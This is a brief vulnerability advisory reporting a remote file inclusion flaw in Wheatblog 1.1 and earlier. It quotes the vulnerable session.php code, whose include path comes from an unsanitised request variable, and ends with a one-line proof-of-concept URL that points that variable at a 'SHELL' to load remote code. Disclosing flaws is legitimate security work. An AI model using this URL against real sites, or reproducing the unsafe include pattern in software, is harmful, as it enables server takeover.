Wheatblog <= 1.1 (session.php) Remote File Include Vulnerability
================================================================




###########################################################################################
#                                   Aria-Security.net Advisory                            #
#                                 Discovered  by: O.U.T.L.A.W                             #
#                      Gr33t to: A.u.r.a  & l2odon & DrtRp & Sh3ll                        #              
###########################################################################################


<?php
include_once("$wb_class_dir/classDatabase.php");


function Start_Session()
{
    global $session_dir;

    if ( $session_dir != &#039;&#039; )
        session_save_path($session_dir);

    if ( ! isset($_SESSION) )
    {
        session_start();
        // Supposedly a fix for IE6
        header(&#039;Cache-control: private&#039;);
        My_Cache();

        if ( ! isset($_SESSION[&#039;db&#039;]) || gettype($_SESSION[&#039;db&#039;]->db) != &#039;resource&#039;)
            touchDatabaseSession();

    }
}


***********************************************************************

Proof of Concept:
www.site.com/includes/session.php?wb_class_dir=SHELL




